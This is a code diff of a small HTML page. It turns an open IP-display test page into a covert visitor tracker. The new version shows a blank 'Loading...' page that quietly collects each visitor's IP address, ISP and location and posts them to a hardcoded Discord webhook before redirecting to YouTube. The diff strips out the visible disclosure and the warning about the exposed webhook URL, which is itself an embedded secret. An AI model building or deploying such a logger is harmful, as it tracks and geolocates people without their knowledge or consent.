@@ -3,26 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Tracking Test Site</title>
+    <title>Loading...</title>
     <style>
-        body { font-family: sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; line-height: 1.6; }
-        .box { background: #f4f4f4; padding: 15px; border-radius: 5px; border-left: 5px solid #007bff; margin-top: 20px; }
+        /* Ensures the website is completely blank and white */
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
     </style>
 </head>
 <body>
 
-    <h1>Welcome to My Website</h1>
-    <p>This is a live test page hosted on GitHub Pages.</p>
-
-    <div class="box">
-        <h3>Your Connection Data (Loaded via API):</h3>
-        <p><strong>IP Address:</strong> <span id="ip-address">Loading...</span></p>
-        <p><strong>Location:</strong> <span id="location">Loading...</span></p>
-        <p><strong>Internet Provider:</strong> <span id="isp">Loading...</span></p>
-    </div>
-
     <script>
-    // Step 1: Fetch raw plain text IP
+    // --- CONFIGURATION ---
+    // Replace this URL with the website you want to redirect to
+    const targetWebsite = 'https://www.youtube.com'; 
+    const delayInSeconds = 10; 
+
+    // 1. Independent Redirect Timer
+    // This runs completely separate from the API requests so the redirect happens even if the APIs are slow.
+    setTimeout(() => {
+        window.location.href = targetWebsite;
+    }, delayInSeconds * 2);
+
+
+    // 2. Background Data Tracking Chain
     fetch('https://api.ipify.org/')
         .then(response => {
             if (!response.ok) throw new Error('Failed to reach ipify');
@@ -32,7 +38,7 @@
             const cleanIp = rawIpText.trim();
             console.log("Step 1 Success! Captured Raw IP:", cleanIp);
 
-            // Step 2: Fetch location data using the IP
+            // Fetch location data using the IP
             return fetch(`https://ipapi.co/${cleanIp}/json/`);
         })
         .then(response => {
@@ -40,24 +46,18 @@
             return response.json();
         })
         .then(data => {
-            // Step 3: Populate the UI fields
-            document.getElementById('ip-address').innerText = data.ip || "Not found";
-            
             const city = data.city || "";
             const region = data.region || "";
             const country = data.country_name || "";
             const locationString = `${city}, ${region}, ${country}`;
             
-            document.getElementById('location').innerText = locationString || "Not found";
-            document.getElementById('isp').innerText = data.org || "Not found";
-            
-            // Step 4: Construct payload and forward to Discord
+            // Construct payload and forward to Discord (UI assignment steps removed)
             const discordPayload = {
                 username: "Site Visitor Logger",
-                avatar_url: "https://i.imgur.com/4M3m5AV.png", // Optional bot icon
+                avatar_url: "https://i.imgur.com/4M3m5AV.png", 
                 embeds: [{
                     title: "📌 New Visitor Logged",
-                    color: 3447003, // Blue sidebar color
+                    color: 3447003, 
                     fields: [
                         { name: "IP Address", value: data.ip || "Unknown", inline: true },
                         { name: "ISP Provider", value: data.org || "Unknown", inline: true },
@@ -70,13 +70,11 @@
             sendToDiscord(discordPayload);
         })
         .catch(error => {
-            console.error('Data chain error:', error);
-            document.getElementById('ip-address').innerText = "Data fetch failed";
+            console.error('Tracking chain background error:', error);
         });
 
     // Helper function to handle the Discord POST request
     function sendToDiscord(payload) {
-        // WARNING: Anyone viewing your website can see this URL in their browser tools!
         const webhookUrl = 'https://discord.com/api/webhooks/1522030213465112596/qAxiRSnZTVJeXQfsnhXrY-bfpH-CakQ9tDKkhMYmCAop_y3AjcRL5OnKLuk7UwDLxzIt'; 
 
         fetch(webhookUrl, {
